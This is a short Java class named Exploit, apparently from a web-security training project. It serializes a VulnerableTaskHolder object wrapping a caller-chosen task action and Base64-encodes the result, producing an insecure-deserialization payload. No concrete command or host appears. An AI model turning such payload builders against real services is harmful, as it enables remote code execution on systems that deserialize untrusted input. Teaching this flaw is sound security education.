package com.learn.web.security.deserialization;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Exploit {
    public String serialize(String taskAction) throws IOException {
        VulnerableTaskHolder vulnerableTaskHolder = new VulnerableTaskHolder(taskAction);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(vulnerableTaskHolder);
        oos.flush();

        String out = Base64.getEncoder().encodeToString(bos.toByteArray());

        bos.close();
        oos.close();
        return out;
    }
}
